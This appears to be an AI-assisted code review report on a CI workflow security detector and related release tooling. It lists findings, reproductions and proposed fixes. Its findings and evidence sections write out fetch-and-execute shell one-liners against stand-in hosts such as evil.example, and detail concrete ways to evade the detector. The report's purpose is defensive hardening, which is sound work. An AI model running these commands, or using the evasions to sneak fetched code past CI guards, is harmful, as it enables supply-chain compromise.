# REVIEW-FINDINGS — Cycle 9

**Engines:** Opus 4.8 (this session) + Codex (`codex-cli 0.133.0`, `--sandbox read-only`), 5 rounds.
**Scope:** commit `3de2420 "Updates"` (+1883 / -154 across 45 files) on `feat/python-container-service`, plus standing code in the touched modules.
**Every finding below was empirically reproduced** against the live detector and/or the in-CI grep mirror (commands in §Evidence).

---

## Headline — is this codebase "flapping"? (explicit goal question)

**Yes — but in exactly ONE place: `aviato/plugins/actionpins.py` + its in-CI twin
`.github/workflows/reusable-common-lint.yml`.** Everything else in this commit is sound.

| Signal | Value |
|---|---|
| Commits touching `actionpins.py` | **8** (`333b371`, `7717d2b`, `ebad8a5`, `079e1b6`, `d64876f`, `3f6bb09`, `153fdfa`, `3de2420`) |
| Churn in `3de2420` alone | **+366 / −14** (380 lines touched; file is now 601 lines) |
| What it does | statically decide, from raw workflow text, whether a shell pipeline executes fetched bytes through an interpreter |
| Opus verdict | flapping — chasing an undecidable classification with a growing wrapper/interpreter enumeration |
| Codex verdict (independent) | *"Yes, this is still flapping… the detector is still trying to infer shell execution from raw YAML text, and the CI mirror is a second, weaker implementation."* |

The two engines converged **independently** on the same root cause and the same fix (see §Convergent design).

**The flap is not cosmetic — it has shipped real holes.** Round 8 built a balanced-paren scanner
(`_balanced_paren_bodies`) to catch the exotic `tee >(sh -c "$(cat)")`, while the **single most
common real-world fetch-execute idiom**, `bash -c "$(curl …)"` (how Homebrew installs), sails
through *both* enforcement layers (R9-1). The detector is hardening the rare case and missing the
common one.

**Prior concrete flap with a security regression (traceable in-code):** the PyPI `pip-audit` gate
was `--strict` (fail-closed) → changed in R6 to a `--severity HIGH/CRITICAL` filter that was a
**structural no-op** because pip-audit emits no per-vuln severity, silently turning the gate
**fail-open** → reverted to `--strict` in R7 (`reusable-pypi-publish.yml`, comment `R7-1-PIPAUDIT-NOOP`).
One full cycle shipped with a disabled supply-chain gate.

---

## Findings index (traceability)

| ID | Sev | Area | Engine(s) | Verified | One-line |
|----|-----|------|-----------|----------|----------|
| R9-1 | HIGH | actionpins | Opus | ✅ | `bash <(curl)` / `bash -c "$(curl)"` / `eval "$(curl)"` family missed (no pipe → early return) |
| R9-2 | HIGH | actionpins+lint | Codex R1 #1 | ✅ | YAML-folded `run: >` `curl …\|⏎bash` bypasses both layers |
| R9-3 | HIGH | actionpins+lint | Codex R1 #2 | ✅ | dynamic command word `… \| "$B"` bypasses |
| R9-4 | HIGH | actionpins+lint | Codex R1 #3 | ✅ | docker `--cidfile …@sha256:` masks real unpinned image |
| R9-5 | HIGH | lint parity | Codex R1 #4-6,9 + Opus | ✅ | Python↔grep disagree on 5 axes; parity test checks only 1 |
| R9-6 | MED | actionpins | Codex R1 #8 | ✅ | `curl \| awk/sed` data-processing false-positive |
| R9-7 | MED | actionpins | Codex R1 #7 | ✅ | quoted docs `printf '… \| bash'` false-positive |
| R9-8 | MED | actionpins | Opus | ✅ | `sudo -u sh ls` false-positive (value-eating heuristic) |
| R9-9 | HIGH | app-store wf | Opus + Codex R3 #1 | ✅ | per-step secret scoping defeated by step order (.p8 on disk before operator `eval`) |
| R9-10 | MED | release wf | Codex R3 #2 | ✅ (static) | existing tag idempotent without HEAD check → floating major/tag mismatch |
| R9-11 | LOW | release wf | Codex R3 #3 | ✅ (static) | squash regex interpolates `${NEXT}` unescaped (dots = wildcards) |
| R9-12 | MED | §17 probe | Codex R4 #1 | ✅ | `code_scanning` §17 prerequisite never probed |
| R9-13 | LOW | §17 probe | Codex R4 #2 | ✅ | malformed `reviewers` → determinate `False` vs contract's `None` |
| R9-14 | LOW | cli | Codex R4 #3 | ✅ | missing `gh` reported as API error exit 1 (should be exit 2) |
| R9-15 | HIGH | composition/version | Codex R2 #1 | ✅ | `version_source` locations escape repo root (abs / `..`) |
| R9-16 | MED | composition | Codex R2 #2 | ✅ | `pipelines: {add: }` null → raw TypeError aborts fleet scan (§5.11) |
| R9-17 | MED | version_formats | Codex R2 #3 | ✅ (static) | partial write across files + unmapped write `OSError` |
| R9-18 | MED | rulesets | Codex R2 #4 | ✅ (static) | desired ruleset missing `name` reads clean not broken (§5.14) |
| R9-19 | LOW | rulesets | Codex R2 #5 | ✅ (static) | `apply_rulesets` generator closes over mutable `slugs` |
| R9-20 | HIGH(arch) | §9b selfcheck | Codex R2 #6, R5 #3 + Opus | ✅ | `app-store-connect` in core evades denylist (`\s+` ≠ hyphen) |
| R9-21 | HIGH | ruleset drift | Codex R5 #2 | ✅ | drift/remediation ignores `pipelines` overrides → false drift + unmergeable-PR remediation |

**Methodology / traceability:** 5 rounds, both engines. Opus reviewed every area inline; Codex
(`codex-cli 0.133.0`, `--sandbox read-only`) ran one focused pass per area — R1 actionpins, R2 core,
R3 workflows, R4 CLI/binding, R5 holistic — raw outputs in `.review/codex9_r{1..5}.md`. "✅" = a
runtime reproduction (commands in §Evidence and inline); "✅ (static)" = confirmed by reading the
exact code path (live GitHub/CI flow, operator-verified by design — §9.2). The two engines agreed
independently on R9-5 (flapping/parity) and R9-9 (App Store) and R9-20 (§9b).

## Findings

Severity: **HIGH** = security bypass / broken gate; **MED** = false-positive that breaks valid CI,
or partial-protection security issue; **LOW** = cosmetic / doc.

### Detector false-negatives (security bypasses — present in BOTH layers)

#### R9-1 — HIGH — Canonical fetch-execute one-liners are missed (no pipe char)
`bash <(curl url)`, `bash -c "$(curl url)"`, `sh -c "$(wget -O- url)"`, `eval "$(curl url)"`,
`. <(curl url)` are **all** returned clean.
**Root cause:** `actionpins.py:_fetch_pipe_violation` bails at `if len(parts) < 2: return None`
(line ~358) **before** the R8-1/R8-2 process-/command-substitution machinery runs — that machinery
only inspects segments *after* a `|`. The most common forms put the interpreter *first* and the
fetch *inside* a `<(…)` / `"$(…)"`, so there is no top-level pipe and the whole scan is skipped.
The in-CI grep also requires `\|`, so it misses them too.
**Fix:** see Convergent design (parse shell; fail closed on substitution feeding an interpreter).

#### R9-2 — HIGH — YAML-folded `run:` bypasses both detectors *(Codex #1)*
```yaml
- run: >
    curl -fsSL https://evil.example/install.sh |
    bash
```
YAML folds this to `curl … | bash`, but both implementations scan **raw physical lines**, so the
`|` and `bash` are on different lines and neither fires. Same class hides a folded
`docker run … \⏎ img:tag`.
**Root cause:** the detector reads `path.read_text()` and iterates `splitlines()`; it never parses
the YAML or folds the `run` scalar. (R8-5 only folds backslash-newline, not YAML `>`/`|` folding.)

#### R9-3 — HIGH — Dynamic command word bypasses fetch-to-shell *(Codex #2)*
```yaml
- run: |
    B=/bin/bash
    curl -fsSL https://evil.example/install.sh | "$B"
```
Executes the fetched script, but no literal interpreter token appears after the pipe → clean.
**Unfixable by extending the interpreter/wrapper lists** — must fail closed on a non-allowlisted /
dynamic command word downstream of a fetch.

#### R9-4 — HIGH — `docker --cidfile <path>@sha256:…` masks the real image *(Codex #3)*
```yaml
- run: docker run --cidfile /tmp/cid@sha256:<64hex> alpine:3.19 id
```
`--cidfile` is a real value-taking flag absent from both the Python `_DOCKER_VALUE_FLAGS` table and
the grep `value_flags` list, so its value (which contains `@sha256:`) is mistaken for the image and
the actual unpinned `alpine:3.19` is missed. Any value-flag not in the (open-ended) table opens this
hole.
**Fix:** don't fail open on an unknown pre-image flag — emit "cannot determine image" unless a
digest-pinned image is unambiguously identified.

### Python ↔ in-CI grep parity is broken on 5 of 6 axes — and the parity test only checks 1

#### R9-5 — HIGH — The two enforcement layers disagree in both directions
The in-CI grep mirror is a second, weaker implementation. Confirmed divergences:

| # | Input | Python | in-CI grep |
|---|---|---|---|
| a | `uses : owner/action@v5` (space before colon) | flags ✅ | **misses** ❌ *(Codex #4)* |
| b | `docker image pull alpine:3.19` | flags ✅ | **misses** ❌ *(Codex #5)* |
| c | `docker pull alpine@sha256:abc` (truncated digest) | rejects ✅ | **accepts as pinned** ❌ *(Codex #6)* |
| d | `docker run --rm \⏎ alpine:3.19` (continuation) | folds + flags ✅ | **skips continuation line** ❌ |
| e | `curl … \| grep bash` | clean ✅ | **false-positive flag** ❌ *(Codex #9)* |

**The R8-9 parity test (`tests/test_workflow_guards.py::test_cilint_interps_mirror_actionpins`)
only asserts the `interps='…'` interpreter alternation matches `_INTERPRETERS`.** It does **not**
test the docker forms, `uses` spacing, digest validation, or continuation handling — so it gives
false confidence that the layers agree when 5 axes diverge.
**Fix:** delete the grep mirror; run the one Python scanner in CI (Convergent design #2).

### Detector false-positives (break valid consumer CI)

#### R9-6 — MED — `awk`/`sed` data-processing flagged as fetch-execute *(Codex #8)*
`curl … | awk '/tag_name/{print $2}'` and `curl … | sed -n '1p'` are flagged, though awk/sed are
running a **local program on fetched data**, not executing fetched code. The code comment says the
risky form is `awk -f -`, but R8-10 added bare `awk`/`gawk`/`mawk`/`sed` to `_INTERPRETERS`, so all
uses trip. Parsing a version out of a `curl` response is a common CI idiom — this will break real
pipelines.

#### R9-7 — MED — Quoted documentation flagged *(Codex #7)*
`printf '%s\n' 'curl https://example.com/install.sh | bash'` is flagged. The detector splits on `|`
ignoring shell quoting, so a *string literal* mentioning a pipeline reads as a real one. Breaks CI
that prints help text / generates docs.

#### R9-8 — MED — `sudo -u sh ls` flagged
`curl … | sudo -u sh ls` (run `ls` as the user named `sh`) is flagged as a fetch-to-`sh`. The
value-consumption loop refuses to consume a flag value that "looks like" an interpreter
(`actionpins.py:250-253`), so the username `sh` is mistaken for the command. Illustrates the
fragility of the value-eating heuristic (both an FP here and an FN for `sudo -u user bash`-style
inputs).

### Workflow security

#### R9-9 — MED — App Store secret per-step scoping does not close its stated leak
`reusable-app-store-connect.yml` (R7-4-APPSTORE-OIDC) env-scopes the 6 Apple secrets per-step,
claiming this keeps them away from the operator-controlled `eval "$VERSION_COMMAND"`. But the step
order is **Install signing assets (L182) → Apply version command (L231)**. "Install signing assets"
*already* decoded the `.p8` API key + cert to disk (`$HOME/.appstoreconnect/private_keys/…`,
`$RUNNER_TEMP/certificate.p12`), imported the cert into an **unlocked** keychain, and wrote
`KEYCHAIN_PASSWORD` to **`$GITHUB_ENV`** — so the later operator `eval` (and the `eval
"$SUBMIT_FOR_REVIEW_COMMAND"` step) can still read the signing material off disk / unlock the
keychain regardless of env-scoping. The env-var vector is closed; the on-disk + `GITHUB_ENV` vector
is not.
**Fix:** run "Apply version command" *before* "Install signing assets"; pass `KEYCHAIN_PASSWORD`
via step-scoped `env:`/outputs to only the steps that need it, not `$GITHUB_ENV`; delete the temp
`.p12`/profile immediately after import; clean up the keychain/profile before the upload/submit
`eval` steps. *(Independently confirmed HIGH by Codex R3 #1.)*

#### R9-10 — MED — Existing release tag treated as idempotent without proving it points at HEAD *(Codex R3 #2)*
`reusable-release.yml:204-227`: when `refs/tags/${NEXT}` already exists, tag creation is skipped —
but the run still force-moves the floating major (`git tag -f "${major}"` → HEAD, L217) and creates
GitHub release state for `${NEXT}`. If the existing tag is on commit A and this run is on commit B,
`1` ends up pointing at B while `1.4.0` stays on A — inconsistent published refs. The line-194
version-source proof makes the precondition abnormal (B's manifest must already read `1.4.0`), but
the repo already guards the *sibling* monotonicity case (L211-221), so this fail-closed gap is in
scope.
**Fix:** if `refs/tags/${NEXT}` exists, peel it and compare to `git rev-parse HEAD`; fail before
moving the floating major / creating the release unless they match.

#### R9-11 — LOW — Squash-merge subject regex interpolates `${NEXT}` unescaped *(Codex R3 #3)*
`reusable-release.yml:140`: `grep -Eq "^chore\(release\): ${NEXT}( \(#[0-9]+\))?\$"` — with
`NEXT=1.2.3` the dots are ERE wildcards, so `chore(release): 1x2y3 (#42)` matches. Introduced by the
same R6-4-SQUASH edit that added the `(#N)` suffix. Blast radius is small (the L194 bump-proof
rejects a genuinely wrong commit), but the phase detector doesn't literally match the subject it
documents.
**Fix:** fixed-string compare for `chore(release): ${NEXT}` plus an escaped optional ` (#N)`, or do
it in Python with `re.escape(next)` + `fullmatch`.

### Agnostic-core (§9b) — the headline guarantee has a hole

#### R9-20 — HIGH (architectural) — §9b enforcement misses `app-store-connect`, and a real violation slipped through *(Codex R2 #6 + Opus)*
Two parts, both confirmed against a green gate:
- **The violation:** `core/model.py:53-54` (added this commit, R7-3-APPSTORE-ENV) names the
  deploy-specific identifiers `app-store-connect` and `APPSTORE` in comments — exactly the day-zero
  target name §9b forbids in agnostic core. (The comment even labels itself "DATA, not core
  knowledge" while hardcoding the concrete env name.)
- **The enforcement gap (worse):** `selfcheck.denylist_violations()` builds each multi-word token's
  pattern as `r"\s+".join(...)` → `app store` compiles to `\bapp\s+store\b`. That matches a
  *whitespace* run but **not a hyphen or concatenation**, so `app-store-connect` and `APPSTORE`
  evade the `app store` denylist entry (and `apple` `\bapple\b` never appears). `denylist_violations()`
  returns `[]` — the checker the repo advertises as making agnosticism *"falsifiable and enforced"*
  (CLAUDE.md) passes a genuine violation.

This is the most important non-detector finding: a recent change introduced a §9b breach **and** the
guardrail meant to catch it has a separator-normalization hole. Both are real (empirically: the
strict gate is green with `app-store-connect` present in core).
**Fix:** (1) remove the concrete env name from `core/model.py` (say "protected-environment
prerequisite"); keep `app-store-connect` only in plug-in data. (2) Normalize separators in the
denylist matcher — join token parts with `[\s_-]+` and treat internal `-`/`_` as token separators
when scanning — and/or add `appstore`/`app-store` forms to `denylist.txt`. The matcher should fail
on the form that actually appears in GitHub Environment names (hyphenated).
**Evidence:**
```python
from aviato.core.selfcheck import denylist_violations
denylist_violations()            # => []  (model.py NOT flagged)
# core/model.py:54 contains "app-store-connect"; denylist.txt contains "app store" + "apple"
```

### Core engine (fleet/version/ruleset robustness)

#### R9-15 — HIGH — `version_source` locations escape the repo root *(Codex R2 #1)*
`_validated_locations` (composition.py:71) accepts absolute paths and `..` components, and
`version_formats.bump_files` writes `Path(root) / location`. Since `Path("/repo") / "/tmp/x"` ==
`/tmp/x` and `Path("/repo") / "../../etc/x"` escapes `root`, a consumer declaration
`overrides: {version_source: {locations: ["/tmp/pkg.json", "../other/pyproject.toml"]}}` makes
`aviato bump-version` (run during the release workflow) mutate files **outside** the consumer repo.
**Fix:** reject absolute paths, `..` components, and whitespace in `_validated_locations`; enforce
resolved-path containment in `bump_files`.
**Evidence:** `_validated_locations({'locations':['/tmp/pkg.json','../other']}, context='x')` →
accepted; `Path('/repo')/'/tmp/pkg.json'` → `/tmp/pkg.json`.

#### R9-16 — MED — `pipelines: {add: }` (present-but-null) aborts the whole fleet scan *(Codex R2 #2)*
`composition.py:231` uses `pipeline_override.get("add", ())` — the default only applies when the key
is **absent**, so a present-null `add:`/`remove:` passes `None` into `merge_list`, which raises a raw
`TypeError: 'NoneType' object is not iterable` — outside `scan_fleet`'s `except AviatoError` guard, so
one malformed consumer aborts the operator's entire fleet scan (§5.11). This is the exact class fixed
in 4 other spots this commit (declaration/diagnosis/registry/default_branch) but missed here.
**Fix:** validate `pipelines.add`/`remove` are lists of non-blank strings (or use `… or ()`),
raising `CompositionError`.
**Evidence:** `merge_list(['a','b'], add=None, remove=())` → `RAW TypeError` (verified).

#### R9-17 — MED — `bump_files` is read/render-atomic but not write-atomic; write `OSError` not mapped *(Codex R2 #3)*
`version_formats.py:198`: the two-pass refactor (R5-2-PARTIAL) renders all locations before writing,
but if the 2nd of two `atomic_write`s fails (perms/full disk), the 1st file is already rewritten —
inconsistent version-source. The version content is self-healing on idempotent re-run, but the raw
`OSError` is not mapped to `AviatoError`, so it leaks a traceback past the CLI (§2.4). 
**Fix:** wrap the write loop's `OSError` as `AviatoError`; optionally stage all temps then swap with
rollback for true all-or-nothing.

#### R9-18 — MED — `drifted_ruleset_names` silently drops a desired ruleset missing `name` (§5.14) *(Codex R2 #4)*
`rulesets.py:172` skips desired payloads without a string `name`, so if library data ever drops a
`name`, that ruleset's absence reads **clean** instead of broken — against §5.14.
**Fix:** validate desired payloads in render; raise on a missing/non-string `name`.

#### R9-19 — LOW — `apply_rulesets` generator closes over mutable `slugs` *(Codex R2 #5)*
`rulesets.py:221`: the R2-4-6 generator refactor captures `slugs` by reference, so mutating the list
between `gen = apply_rulesets(slugs, …)` and iteration changes which repos are written. (No in-repo
caller does this today; the eager-list version couldn't.) **Fix:** `slugs = tuple(slugs)` before
defining `_stream`.

### CLI + GitHub binding (§17 probes)

#### R9-12 — MED — §17 `code_scanning` prerequisite is never probed *(Codex R4 #1)*
`github_platform.probe_health` (L559) emits `secret_scanning`, `secret_scanning_push_protection`,
`dependabot_security_updates` from `security_and_analysis`, but REQUIREMENTS.md §17 (line 1956) lists
**code scanning** as a probeable §2.13 baseline item, and it isn't in `security_and_analysis` (it's a
separate `repos/{slug}/code-scanning/default-setup` API). So `doctor` silently omits a §17
prerequisite — absence reads clean (§5.14 violation by omission).
**Fix:** add a dedicated code-scanning probe; `remote["code_scanning"]` = `None` on auth/404/schema
ambiguity, `False` only for a determinate not-configured state.

#### R9-13 — LOW — `protected_environment_has_reviewers` maps a malformed `reviewers` to determinate `False` *(Codex R4 #2)*
`github.py:184`: a `required_reviewers` rule with `reviewers: null` / missing falls through to
`return False`, contradicting the function's own None-on-ambiguous contract (L170-173). (Here `False`
is at least fail-closed/"broken", so impact is low, but it's inconsistent.)
**Fix:** when a `required_reviewers` rule is found, return `bool(reviewers)` if it's a list else
`None`; return `False` only when rules parse and no required-reviewers rule exists.

#### R9-21 — HIGH — Ruleset drift + remediation ignore consumer `pipelines` overrides *(Codex R5 #2)*
`_drifted_rulesets` (cli.py) renders desired rulesets with
`extra_status_checks=_profile_status_checks(profile)`, and `_profile_status_checks` (cli.py:96) calls
`resolve_profile(Registry(...), profile)` **with no overrides** — the *base* profile. But the live
repo and the rest of the drift flow use the override-resolved settings (`resolved.settings`). So a
consumer with:
```yaml
overrides:
  pipelines:
    remove: ["python-verify"]
```
correctly drops `ci / Python CI` from `resolved.settings…required_status_checks`, yet the desired
ruleset still *requires* it → `drift-report`/`scan` reports phantom drift on the branch ruleset, and
the suggested remediation `aviato apply-rulesets <repo> --apply --profile python-library` re-adds a
required status check whose workflow no longer runs — a **required check that can never report → PRs
become unmergeable**. Note the partial fix already present (CX#1 flows the resolved `required_reviews`
override into the render) — it just wasn't extended to `pipelines` overrides. Classic incomplete-coverage.
**Fix:** render the desired ruleset's `extra_status_checks` from the **override-resolved** settings
(`resolved.settings…required_status_checks`), not `_profile_status_checks(profile)`; give the
remediation command a way to honor the declaration/overrides, not only `--profile`.

#### R9-14 — LOW — `apply-rulesets` reports a missing `gh` binary as a GitHub API error (exit 1, not 2) *(Codex R4 #3)*
The R2-4-4 change maps a missing `gh` to `CommandError(…, 127, …)`; the R3-2 change in
`cli.py:156` catches all `CommandError` → "GitHub API error", exit 1. So an operator-environment
failure (gh not installed) is misreported as an API failure with the wrong exit code (should be the
exit-2 operator-environment path). Two independently-correct changes interacting.
**Fix:** in `cmd_apply_rulesets`, special-case `CommandError.returncode == 127` → exit 2.

---

## What is NOT flapping (positive convergence)

These changes in `3de2420` are legitimate, mostly first-time, well-reasoned fixes — keep them:

- **Core fail-closed hardening** — `declaration.py`/`diagnosis.py` map `UnicodeDecodeError`/`OSError`
  to `AviatoError` so a non-UTF-8 or directory path can't abort a fleet scan (§5.11);
  `registry._load_optional_manifest`; `composition._validated_locations` + scalar-`default_branch`
  guard; `version_formats.bump_files` two-pass read-then-write (no half-applied bump) + dedupe;
  `settingsdrift` nested-dict additive/destructive branch; `command.run` OSError→CommandError.
- **GitHub binding** — `(.get(k) or {})` present-but-null hardening in `github_platform.map_branch_settings`
  / `_unmodeled_*` (GitHub serializes present-null fields); new `protected_environment_has_reviewers`
  / `pages_source_is_actions` §17 probes return `None` on ambiguous reads (§5.14).
- **Workflows** — PyPI build(`contents:read`)/publish(`id-token`) job split isolates operator build
  code from the OIDC token; `pip-audit --strict` revert; GHCR lowercase image ref; release-gate
  `git merge-base --is-ancestor` (fixes valid-release rejection when an unrelated push lands during
  the docs-deploy window); release squash-merge `(#N)` suffix + `tag` output sourced from the
  tag-phase step.

Both Codex (R5) and Opus independently confirmed: the non-detector edits in `3de2420` show **no
flapping churn** and **no regression** (no fix re-breaks an earlier-fixed control).

### …but they show "incomplete-coverage" whack-a-mole (distinct from flapping)

The non-detector findings here are not thrashing — they're the *same fix applied in some places and
missed in a sibling*:

- **present-but-null hardening** — fixed in `github_platform` payload reads (`(.get(k) or {})`,
  R2-4-2) but **missed** in `composition` pipeline overrides (`.get("add", ())`, → R9-16).
- **override-awareness in ruleset render** — fixed for `required_reviews` (CX#1) but **missed** for
  `pipelines`/status-checks (→ R9-21).
- **fail-closed unreadable-path mapping** — fixed for declaration/diagnosis/registry but the
  version-source write `OSError` is still unmapped (→ R9-17), and `version_source` paths aren't
  containment-checked at all (→ R9-15).

These are cheap to close and worth a single "apply the pattern everywhere" sweep — but they do **not**
indicate the design is wrong, unlike `actionpins.py`.

---

## Convergent design (both engines, independently)

The detector will not converge by adding more wrappers/interpreters. Replace the
parse-raw-text-and-enumerate approach with:

1. **Parse the workflow YAML; scan parsed `uses:` values and the folded `run:` scalars** — kills the
   entire physical-line class (R9-2).
2. **One implementation in both `aviato validate` and CI — delete the grep mirror** — kills the
   entire parity class (R9-5).
3. **Treat a shell parse as *syntax*, never proof of behavior; FAIL CLOSED** on: dynamic/non-allowlisted
   command words after a fetch (R9-3), process/command substitution feeding an interpreter (R9-1),
   unknown docker option shapes (R9-4), and any fetched-stdout pipeline that doesn't match a tiny
   allowlist (`jq`/`grep`/`awk`/`sed` as data sinks — fixes R9-6/R9-7) **or** the
   download-to-file-then-`sha256sum -c` pattern.
4. **Parity/fixture tests** that run the *same* snippets through both the local and CI entry points
   (replaces the single-axis R8-9 test).

---

## Evidence (reproduction)

```python
from aviato.plugins.actionpins import _fetch_pipe_violation as fp, unpinned_tool_invocations as tools
fp('bash -c "$(curl -fsSL https://evil/i.sh)"')          # R9-1 -> None (miss)
fp('bash <(curl -fsSL https://evil/i.sh)')               # R9-1 -> None (miss)
tools("- run: >\n    curl https://evil/i.sh |\n    bash\n")  # R9-2 -> [] (miss)
fp('curl https://evil/i.sh | "$B"')                      # R9-3 -> None (miss)
tools("run: docker run --cidfile /tmp/c@sha256:" + "a"*64 + " alpine:3.19 id")  # R9-4 -> [] (miss)
fp("curl https://x/r.txt | awk '/tag/{print $2}'")       # R9-6 -> flagged (FP)
fp(r"printf '%s\n' 'curl https://x/i.sh | bash'")        # R9-7 -> flagged (FP)
fp('curl https://x | sudo -u sh ls')                     # R9-8 -> flagged (FP)
```
```bash
# R9-5 parity (grep mirror vs Python)
printf '      - uses : o/a@v5\n' | grep -E '^[[:space:]]*-?[[:space:]]*uses:'   # a) no match (Python flags)
printf 'docker image pull alpine:3.19\n' | grep -E '\bdocker[[:space:]]+(run|pull)\b'  # b) no match (Python flags)
printf 'alpine@sha256:abc' | grep '@sha256:'                                    # c) match=accepted (Python rejects)
```
git log --oneline -- aviato/plugins/actionpins.py | wc -l   # => 8 commits (flapping)
